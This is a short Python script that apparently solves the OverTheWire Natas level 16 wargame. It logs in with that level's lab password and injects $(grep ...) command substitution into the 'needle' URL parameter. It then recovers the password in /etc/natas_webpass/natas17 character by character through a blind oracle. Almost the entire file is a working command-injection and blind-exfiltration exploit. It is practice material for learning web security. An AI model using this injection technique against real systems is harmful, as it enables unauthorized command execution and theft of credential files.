#!/bin/python3
 
import requests
from requests.auth import HTTPBasicAuth
 
url = 'http://natas16.natas.labs.overthewire.org/?needle='
s = requests.Session()
s.auth = HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
 
passfile17 = '/etc/natas_webpass/natas17'
prefix = 'tested'
 
def get_password_chars():
    filtered = ''
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
 
    print('Looking for password char set...')
    for char in chars:
        input_text = f'^{prefix}$(grep {char} {passfile17})'
        if is_hit(input_text):
            filtered += char
            print(f'The password contains: {filtered}')
 
    return filtered
 
def get_password(filtered):
    password = ''
    for i in range(32):
        print(f'Looking for the position {i}...')
 
        for char in filtered:
            input_text = f'^{prefix}$(grep ^{password}{char} {passfile17})'
            if is_hit(input_text):
                password += char
                print(password)
                break
 
    return password
 
def is_hit(data):
    resp = s.get(f'{url}{data}')
    return resp and prefix not in resp.text
 
# Step 1: Find out what chars the password contains
password_chars = get_password_chars()
 
# Step 2: Find out the password by ordering the chars found in step 1
password = get_password(password_chars)
print(f'The password is: {password}')
